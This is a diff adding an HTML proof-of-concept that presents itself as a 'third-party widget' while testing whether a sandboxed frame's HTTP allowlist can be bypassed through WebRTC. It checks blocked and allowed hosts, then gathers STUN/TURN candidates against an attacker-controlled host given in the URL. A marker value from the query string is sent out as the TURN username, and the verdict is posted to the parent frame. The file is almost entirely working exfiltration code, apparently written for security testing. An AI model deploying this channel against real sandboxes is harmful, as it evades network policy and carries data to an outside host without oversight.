@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<title>widget</title>
+<style>body{font:11px/1.45 ui-monospace,Menlo,Consolas,monospace;margin:6px;color:#444;background:#fafafa}
+pre{margin:0;white-space:pre-wrap;word-break:break-all}</style>
+</head><body><pre id="o">third-party widget loading...</pre>
+<script>
+(function(){
+ var q=new URLSearchParams(location.search);
+ var X=q.get('x')||'';                               // attacker host:port you control
+ var P=q.get('p')||('TESTDATA-'+Math.random().toString(36).slice(2,10));
+ var BLOCKED='https://example.com/', ALLOWED='https://chatgpt.com/favicon.ico';
+ var STUN = X ? 'stun:'+X : 'stun:stun.l.google.com:19302';
+ var o=document.getElementById('o'); var lines=[];
+ function say(s){lines.push(s);o.textContent=lines.join('\n');
+   try{parent.postMessage({src:'widget',line:s},'*')}catch(e){}}
+ var R={http:null,ref:null,srflx:false,relay:false};
+ function verdict(){
+   if(R.http===null||R.ref===null)return;
+   var v;
+   if(R.http==='reached') v='INVALID - non-allowlisted HTTP was allowed, policy not enforcing';
+   else if(R.ref==='blocked') v='INVALID - allowlisted host also blocked, network down';
+   else if(R.relay) v='CONFIRMED - HTTP blocked; TURN relay allocated on non-allowlisted host; test marker sent';
+   else if(R.srflx) v='CONFIRMED - HTTP blocked; WebRTC egress reached non-allowlisted host';
+   else v='NO BYPASS - HTTP blocked and no external candidate formed';
+   try{parent.postMessage({src:'widget',verdict:v},'*')}catch(e){}
+   say('VERDICT: '+v);
+ }
+ say('frame origin : '+location.origin);
+ say('egress target: '+(X||'stun.l.google.com:19302 (public)'));
+ say('test marker  : '+P);
+ say('');
+ fetch(BLOCKED,{mode:'no-cors',cache:'no-store'})
+  .then(function(){R.http='reached';say('CHECK 1 REACHED  example.com allowed');verdict()})
+  .catch(function(){R.http='blocked';say('CHECK 1 BLOCKED  example.com refused');verdict()});
+ fetch(ALLOWED,{mode:'no-cors',cache:'no-store'})
+  .then(function(){R.ref='ok';say('CHECK 2 REACHED  chatgpt.com ok, network live');verdict()})
+  .catch(function(){R.ref='blocked';say('CHECK 2 BLOCKED  chatgpt.com failed');verdict()});
+ try{
+  var ice=[{urls:STUN}];
+  if(X) ice.push({urls:'turn:'+X+'?transport=udp',username:P,credential:'x'});
+  var pc=new RTCPeerConnection({iceServers:ice});
+  pc.createDataChannel('p');
+  pc.onicecandidate=function(e){
+   if(!e.candidate){say('ice gathering complete');verdict();return}
+   var c=e.candidate.candidate;
+   if(c.indexOf(' typ srflx')>-1&&!R.srflx){R.srflx=true;say('CHECK 3 SRFLX    egress reached non-allowlisted host')}
+   if(c.indexOf(' typ relay')>-1&&!R.relay){R.relay=true;say('CHECK 4 RELAY    TURN allocated, marker delivered')}
+   if(c.indexOf('srflx')>-1||c.indexOf('relay')>-1) say('  '+c);
+   verdict();
+  };
+  pc.createOffer().then(function(d){return pc.setLocalDescription(d)});
+ }catch(e){say('CHECK 3 ERROR    '+e.message)}
+ setTimeout(verdict,20000);
+})();
+</script></body></html>
